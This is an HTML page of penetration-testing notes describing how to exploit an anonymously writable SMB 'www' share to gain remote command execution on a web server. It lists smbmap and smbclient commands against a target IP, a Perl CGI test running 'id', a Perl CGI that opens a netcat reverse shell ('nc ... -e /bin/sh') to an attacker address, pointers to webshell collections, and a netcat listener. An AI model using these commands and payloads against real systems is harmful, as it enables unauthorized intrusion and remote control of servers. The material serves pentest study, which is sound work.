<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SMB www writable share</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SMB www writable share</h1><br/>*seen also in <a href="ation_Test_Methodology--Network_Pentest--Vulnerability_assessment--Manual_Testing--NetBIOS,_SMB--Configuration_issues--www_writable_share.html">Network → Vulnerability assessment → NetBIOS, SMB → Configuration issues → www writable share</a><br /><br /><strong><h3>Prerequisites</h3></strong><br />• www writable share folder available to us<br />     <div class="codebox"><div class="codebox">root@kali:/#&nbsp;smbmap&nbsp;-H&nbsp;<span style="color:#000000;font-weight:400">[</span>ipAddress<span style="color:#000000;font-weight:400">]</span></div></div><br />    <a href=""><img src="images/1445-1.png" alt="images/1445-1.png" /></a><br />• Web server support interpreted(scripting) language<br />    Access to the access the &lt;writableTargetFolder&gt; share. Inside it we should have a “rootfs” directory(SMBTARGET)<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;smbclient&nbsp;\\\\81.249.228.239\\www&nbsp;-N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#anonymous&nbsp;access&nbsp;<br />smb:&nbsp;\&gt;&nbsp;recurse&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#enable&nbsp;recursion&nbsp;listing&nbsp;on&nbsp;smb<br />smb:&nbsp;\&gt;&nbsp;ls<br />smb:&nbsp;\&gt;&nbsp;recurse&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#disable&nbsp;recursion&nbsp;listing&nbsp;on&nbsp;smb<br />smb:&nbsp;\&gt;&nbsp;mget&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>Target&nbsp;Directory&nbsp;to&nbsp;Download<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /><br />We have to ask to ourselves these questions:<br />1. Is a web server-interpreted languages we can use to our advantage? Check for these file extensions in the www share:<br />   ◇ PHP (*.php, *.php3, *.php4, *.phtml)<br />   ◇ Python (*.py) <br />   ◇ R (*.rhtml) <br />   ◇ Ruby (*.rb, *.rbw)<br />   ◇ JavaScript using Server-side JavaScript (*.ssjs, *.js) <br />   ◇ Perl via the CGI.pm module (*.cgi, *.ipl, *.pl)<br />   To inspect one of these file we can download it locally<br />        <div class="codebox"><div class="codebox">smb:&nbsp;\&gt;&nbsp;get&nbsp;[file]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;download&nbsp;a&nbsp;file&nbsp;locally&nbsp;and&nbsp;inspect&nbsp;these&nbsp;files</div></div><br />2. Can we upload any files to this(www) directory, and how will the web server handle our files?         <br />        <div class="codebox"><div class="codebox">smb:&nbsp;\&gt;&nbsp;smbclient&nbsp;\\\\[targetIp]\\www&nbsp;-N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#anonymous&nbsp;access<br />smb:&nbsp;\&gt;&nbsp;put&nbsp;[file]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;upload&nbsp;a&nbsp;file&nbsp;on&nbsp;the&nbsp;target</div></div><br />        the file that we will put, must be with a interpreted language. For example for perl upload a <code>test.pl</code> file with:<br />        <div class="codebox"><div class="codebox">#!/usr/bin/perl<br />print&nbsp;&quot;Content-type:&nbsp;text/html\n\n&quot;;<br />system(&quot;id&quot;);</div></div><br />        or in alternative to directly put a bash reverse shell<br />        <div class="codebox"><div class="codebox">#!/usr/bin/perl<br />print&nbsp;&quot;Content-type:&nbsp;text/html\n\n&quot;;<br />system<span style="color:#000000;font-weight:400">(</span>&quot;nc&nbsp;192.168.13.18&nbsp;1234&nbsp;-e&nbsp;/bin/sh&quot;<span style="color:#000000;font-weight:400">)</span></div></div><br />3. Check how the web server handle this script<br />    go with the browser to the web server of the target address, to the file uploaded<br />    <a href=""><img src="images/1445-2.png" alt="images/1445-2.png" /></a><br /><br />4. Can we exploit that to obtain remote command execution?<br />    If the command <code>id</code> is been displayed. this mean we can also upload a reverse shell.<br />    For a complete list of reverse shells see:<br />   ◇ <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br />   ◇ or directly on kali<br />        <div class="codebox"><div class="codebox">root@kali:/#&nbsp;cd&nbsp;/usr/share/webshells<br />root@kali:/#&nbsp;ls</div></div><br />        <a href=""><img src="images/1445-3.png" alt="images/1445-3.png" /></a><br />    These scripts needs small modifications before using it. <br />    <span style="color:#a5452a;">For example for a Perl reverse shell we have to edit Ip and Port.</span><br />    <a href=""><img src="images/1445-4.png" alt="images/1445-4.png" /></a><br />      <br />5. Now we have to upload the web reverse shell (On point 2 we have tested if the web server handle scripting language)<br />    <div class="codebox"><div class="codebox">smb:&nbsp;\&gt;&nbsp;put&nbsp;[file]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;upload&nbsp;the&nbsp;web&nbsp;server&nbsp;reverse&nbsp;shell&nbsp;on&nbsp;the&nbsp;target</div></div><br /><br />6. Listen and wait<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div></div><br />    <a href=""><img src="images/1445-5.png" alt="images/1445-5.png" /></a><br />7. Now we have to navigate with the browser to the file we have uploaded to trigger the web reverse shell</div>
</body>
</html>
